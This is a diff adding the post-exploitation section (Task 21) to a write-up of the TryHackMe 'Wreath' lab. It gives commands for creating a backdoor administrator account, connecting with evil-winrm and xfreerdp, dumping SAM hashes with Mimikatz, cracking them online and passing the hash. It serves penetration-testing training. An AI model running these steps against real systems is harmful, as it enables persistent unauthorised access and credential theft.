@@ -1161,6 +1161,8 @@
    ![alt_text](https://github.com/kashyap-source/Try-Hack-Me/blob/master/Wreath/Image/Screenshot_4.png)
 
    If you are using cURL then there are a variety of options available. cURL does provide a --data-urlencode switch; however, it's often easiest to just use a website to encode    the shell command, then copy it in with the -d switch:
+   
+      curl -X POST -d "a=power........"
 
    Pick a method (cURL, BurpSuite, or any others) and get a shell!
    
@@ -1169,11 +1171,149 @@
    ![image](https://user-images.githubusercontent.com/68686150/115831052-b6f6a380-a42e-11eb-8fd5-38295cc949c4.png)
 
 
+***[Task 21]: Git Server Stabilisation & Post Exploitation***
 
+   In the last task we got remote command execution running with the highest permissions possible on a local Windows machine, which means that we do not need to escalate          privileges on this target.
 
+   In the upcoming tasks we will be looking at the second teaching point of this network -- the command and control framework: Empire. Before we do that though, let's              consolidate our position a little.
 
+   From the enumeration we did on this target we know that ports 3389 and 5985 are open. This means that (using an account with the correct privileges) we should be able to        obtain either a GUI through RDP (port 3389) or a stable CLI shell using WinRM (port 5985).
 
+   Specifically, we need a user account (as opposed to the service account which we're currently using), with the "Remote Desktop Users" group for RDP, or the "Remote              Management Users" group for WinRM. A user in the "Administrators" group trumps the RDP group, and the original Administrator account can access either at will.
 
+   We already have the ultimate access, so let's create such an account! Choose a unique username here (your TryHackMe username would do), and obviously pick a password which      you don't use anywhere else.
+
+   First we create the account itself:
+
+      net user USERNAME PASSWORD /add
+
+   Next we add our newly created account in the "Administrators" and "Remote Management Users" groups:
+
+     net localgroup Administrators USERNAME /add
+
+     net localgroup "Remote Management Users" USERNAME /add
+
+   ![image](https://user-images.githubusercontent.com/68686150/115832037-06899f00-a430-11eb-9ee7-f67dcb042601.png)
+
+   ![image](https://user-images.githubusercontent.com/68686150/115832098-17d2ab80-a430-11eb-91f9-976e8299b119.png)
+
+   We can now use this account to get stable access to the box!
+
+   As mentioned previously, we could use either RDP or WinRM for this.
+
+   Note: Whilst the target is set up to allow multiple sessions over RDP, for the sake of other users attacking the network in conjunction with memory limitations on the          target, it would be appreciated if you stuck to the CLI based WinRM for the most part. We will use RDP briefly in the next section of this task, but otherwise please use        WinRM when moving forward in the network.
+
+   Let's access the box over WinRM. For this we'll be using an awesome little tool called evil-winrm.
+
+   This does not come installed by default on Kali, so use the following command to install it from the Ruby Gem package manager:
+
+      sudo gem install evil-winrm
+
+   With evil-winrm installed, we can connect to the target with the syntax shown here:
+
+     evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP
+
+   ![image](https://user-images.githubusercontent.com/68686150/115832274-55cfcf80-a430-11eb-86dc-4188a019407e.png)
+
+   ![image](https://user-images.githubusercontent.com/68686150/115832317-62542800-a430-11eb-9d8c-a701f73b3fcc.png)
+
+   If you used an SSH portforward rather than sshuttle to access the Git Server, you will need to set up a second tunnel here to access port 5985. In this case you may also        need to specify the target port using the -P switch (e.g. -i 127.0.0.1 -P 58950).
+
+   Note that evil-winrm usually gives medium integrity shells for added administrator accounts. Even if your new account has Administrator permissions, you won't actually be      able to perform administrative actions with it via winrm.
+
+   Now let's look at connecting over RDP for a GUI environment.
+
+   There are many RDP clients available for Linux. One of the most versatile is "xfreerdp" -- this is what we will be using here. If not already installed, you can install        xfreerdp with the command:
+   
+      sudo apt install freerdp2-x11
+
+   As mentioned, xfreerdp is an incredibly versatile tool with a vast number of options available. These range from routing audio and USB connections into the target, through      to pass-the-hash attacks over RDP. The most basic syntax for connecting is as follows:
+
+     xfreerdp /v:IP /u:USERNAME /p:PASSWORD
+
+   For example:
+
+     xfreerdp /v:172.16.0.5 /u:user /p:'password123!'
+
+   ![image](https://user-images.githubusercontent.com/68686150/115832544-a34c3c80-a430-11eb-9cca-67f0a211ca00.png)
+
+   That said, we can do a lot more with xfreerdp. These switches are particularly useful:-
+
+   - /dynamic-resolution -- allows us to resize the window, adjusting the resolution of the target in the process
+   - /size:WIDTHxHEIGHT -- sets a specific size for targets that don't resize automatically with /dynamic-resolution
+   - +clipboard -- enables clipboard support
+   - /drive:LOCAL_DIRECTORY,SHARE_NAME -- creates a shared drive between the attacking machine and the target. This switch is insanely useful as it allows us to very easily use      our toolkit on the remote target, and save any outputs back directly to our own hard drive. In essence, this means that we never actually have to create any files on the        target. For example, to share the current directory in a share called share, you could use: /drive:.,share, with the period (.) referring to the current directory
+
+   When creating a shared drive, this can be accessed either from the command line as \\tsclient\, or through File Explorer under "This PC":  
+
+   ![image](https://user-images.githubusercontent.com/68686150/115832715-d68ecb80-a430-11eb-90d2-5d5b27e6d8af.png)  
+
+   Note that the name of the share will change according to what you selected in the /drive switch.
+
+   A useful directory to share is the /usr/share/windows-resources directory on Kali. This shares most of the Windows tools stockpiled on Kali, including Mimikatz which we will    be using next. This would make the full command:
+   
+      xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
+
+   ![image](https://user-images.githubusercontent.com/68686150/115832817-f625f400-a430-11eb-979f-a017f9962065.png)
+
+   With GUI access obtained and our Windows resources shared to the target, we can now very easily use Mimikatz to dump the local account password hashes for this target. Next    we open up a cmd.exe or PowerShell window as an administrator (i.e. right click on the icon, then click "Run as administrator") in the GUI and enter the following command:
+
+      \\tsclient\share\mimikatz\x64\mimikatz.exe
+
+   ![alt_text](https://github.com/kashyap-source/Try-Hack-Me/blob/master/Wreath/Image/Screenshot_5.png)
+
+   Note: if you used a different share name, you would need to substitute this in. Equally, if the command errors out, you may need to install mimikatz on Kali with 
+   
+      sudo apt install mimikatz.
+
+   With Mimikatz loaded, we next need to give ourselves the Debug privilege and elevate our integrity to SYSTEM level. This can be done with the following commands:
+
+     privilege::debug
+     token::elevate
+
+   ![alt_text](https://github.com/kashyap-source/Try-Hack-Me/blob/master/Wreath/Image/Screenshot_6.png)
+
+   If we want we could log Mimikatz output with the log command. For example: log c:\windows\temp\mimikatz.log, would save the Mimikatz output into the Windows Temp directory.    This could also be saved directly into our Kali machine, but be aware that the remote destination must be writeable to the local user running the RDP session.
+
+   We can now dump all of the SAM local password hashes using:
+
+     lsadump::sam
+
+   Near the top of the results you will see the Administrator's NTLM hash:
+
+   ![image](https://user-images.githubusercontent.com/68686150/115833253-72b8d280-a431-11eb-8d00-8ef591520d3a.png)
+
+   ![image](https://user-images.githubusercontent.com/68686150/115833315-87956600-a431-11eb-8649-9ba4889daf01.png) 
+
+   ![image](https://user-images.githubusercontent.com/68686150/115833679-f246a180-a431-11eb-8f9e-06ea60614199.png)
+
+   ![image](https://user-images.githubusercontent.com/68686150/115833603-dd6a0e00-a431-11eb-9586-6035846afea5.png)
+
+   You won't be able to crack the Administratrator hash, but let's try cracking Thomas' password hash. Tools such as Hashcat or John the Ripper are versatile and good for most    password cracking situations; however, the unsalted NTLM password hash we have in our possession can be cracked using a much simpler method.
+
+   Sites such as Crackstation perform password lookups. In other words, they store a huge database of password/hash combinations, meaning that they can take a hash and            instantly look up the already cracked password.
+
+   Use Crackstation to break Thomas' hash!
+
+   ![image](https://user-images.githubusercontent.com/68686150/115834048-65501800-a432-11eb-9fd0-983d87601624.png)
+
+   Note: It should go without saying that you should never enter client password hashes into an online cracking tool in the real world. Crackstation is very good to quickly        find the password in this context, however. Instead we would be more likely to crack the hashes locally using something like Hashcat -- or better yet, pass them over to a      very powerful computer owned by our employers, designed to crack passwords quickly.
+
+   ![image](https://user-images.githubusercontent.com/68686150/115834117-7ac54200-a432-11eb-8716-f3445027dac2.png) 
+
+   In the real world this would be enough to obtain stable access; however, in our current environment, the new account will be deleted if the network is reset.
+
+   For this reason you are encouraged to to use the evil-winrm built-in pass-the-hash technique using the Administrator hash we looted.
+
+   To do this we use the -H switch instead of the -p switch we used before.
+
+   For example:
+
+      evil-winrm -u Administrator -H ADMIN_HASH -i IP
+
+   ![image](https://user-images.githubusercontent.com/68686150/115834211-97617a00-a432-11eb-8dab-0effb9b6a451.png)
+
+   ![image](https://user-images.githubusercontent.com/68686150/115834388-ce379000-a432-11eb-9b56-604e4ee3f206.png)
 
 
 
